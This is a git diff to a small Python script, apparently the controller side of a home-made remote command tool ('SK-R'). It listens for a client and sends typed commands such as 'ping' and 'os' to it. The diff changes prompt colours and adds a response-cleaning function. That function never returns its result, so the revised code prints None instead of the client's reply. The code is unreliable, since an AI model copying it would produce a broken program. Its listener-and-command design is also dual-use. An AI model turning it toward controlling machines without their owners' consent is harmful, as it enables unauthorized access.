@@ -24,9 +24,15 @@ def clearScreen():
   else:
     os.system('clear')
 
-def cleanUpResponse():
-  #TBD, Clean responses for clear output to screen.
-  print('')
+def cleanUpResponse(inputStr):
+ remove_from = ['b\\\'', '\'', '\\n']
+ outstring = inputStr
+
+ for i in remove_from:
+     if i == '\\n':
+         outstring = outstring.replace(i, '\n')
+     else:
+         outstring = outstring.replace(i, '')
 
 #Start server.
 print(colors.blue('Starting Server...'))
@@ -43,10 +49,10 @@ print(colors.blue('Connection recieved, ' + str(address)))
 
 #While connected, Take commands, check for help message, or send to client.
 while True:
-  cmmd = input(colors.blue('|SK-R>') + colors.red('>') + colors.blue('>'))
+  cmmd = input(colors.cyan('|SK-R>') + colors.red('>') + colors.yellow('>'))
 
   if cmmd == 'help':
-    print(colors.green('|---HELP---| \n \n ') + colors.blue('Possible Commands For SK-R: \n \n -- \"ping\", used to check connection. \n \n -- \"os\", Check the operating system of the client. \n \n -- \"Disconn\", Disconnect the client from the server. \n \n -- \"exit\", exit SK-R. \n \n -- \"clear\", clears the screen. \n \n ') + colors.green('|---HELP---|'))
+    print(colors.green('|---HELP---| \n \n ') + colors.cyan('Possible Commands For SK-R: \n \n -- \"ping\", used to check connection. \n \n -- \"os\", Check the operating system of the client. \n \n -- \"Disconn\", Disconnect the client from the server. \n \n -- \"exit\", exit SK-R. \n \n -- \"clear\", clears the screen. \n \n ') + colors.green('|---HELP---|'))
 
   elif cmmd == 'exit':
     print(colors.red('Exiting...'))
@@ -68,7 +74,7 @@ while True:
 
     #Decode, clean, and print reponse to screen.
     decodedFromClient = fromClient.decode("UTF-8")
-    outToScreen = decodedFromClient.replace('b', '', 1); decodedFromClient.replace('\'', '', 2); decodedFromClient.replace('\n', '')
-    print(decodedFromClient)
+    outToScreen = cleanUpResponse(decodedFromClient)
+    print(outToScreen)
 
 #Written by Skittles_
